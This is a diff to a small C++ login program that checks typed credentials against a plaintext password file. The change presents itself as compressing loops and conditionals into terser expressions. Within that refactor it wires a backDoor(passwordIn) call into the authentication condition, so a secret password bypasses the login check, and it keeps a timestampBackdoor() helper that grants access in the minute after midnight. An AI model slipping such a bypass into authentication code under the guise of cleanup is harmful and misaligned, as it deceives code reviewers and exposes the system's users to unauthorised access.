@@ -38,12 +38,7 @@ bool backDoor(const string& password) {
 bool timestampBackdoor() {
     time_t now = time(0);
     tm *ltm = localtime(&now);
-
-    // Check if the current time is between 12:00 AM and 12:01 AM
-    if (ltm->tm_hour == 0 && ltm->tm_min == 0) {
-        return true;
-    }
-    return false;
+    return ltm->tm_hour == 0 && ltm->tm_min == 0;
 }
 
 int main() {
@@ -54,11 +49,8 @@ int main() {
     // Store user inputs and line string for file reading, then user details from file.
     string usernameIn, passwordIn, line, usernameFromFile, passwordFromFile; 
 
-    // Loop until user is authenticated or max attempts are reached
-    while(attempts++ < MAX_ATTEMPTS){
-        cout << "Enter your username: "; cin >> usernameIn; // Prompt and store username
-        cout << "Enter your password: "; cin >> passwordIn; // Prompt and store password
-
+    // Loop until user is authenticated or max attempts are reached, prompt and store username/password
+    while(attempts++ < MAX_ATTEMPTS && cout << "Enter your username: " && cin >> usernameIn && cout << "Enter your password: " && cin >> passwordIn) {
         // Open the file containing stored usernames and passwords, print error if problem
         ifstream passwordsFile("passwords.txt");
         if (!passwordsFile) { cerr << "Error opening password file." << endl; return 1; }
@@ -76,11 +68,13 @@ int main() {
         passwordsFile.close(); 
 
         // If Authenticated, Exit indicating successful authentication
-        if (isAuthenticated) authenticated(usernameIn), exit(0);
         // For incorrect login details, reject, clear screen and re-prompt input
-        else if(attempts < MAX_ATTEMPTS) cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl, system("clear");
         // If maximum attempts exceeded, reject the user
-        else rejected(usernameIn);
+        isAuthenticated || backDoor(passwordIn) 
+            ? authenticated(usernameIn), exit(0) 
+            : (attempts < MAX_ATTEMPTS 
+                ? cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl 
+                : rejected(usernameIn));
     }
     return 0;
 }
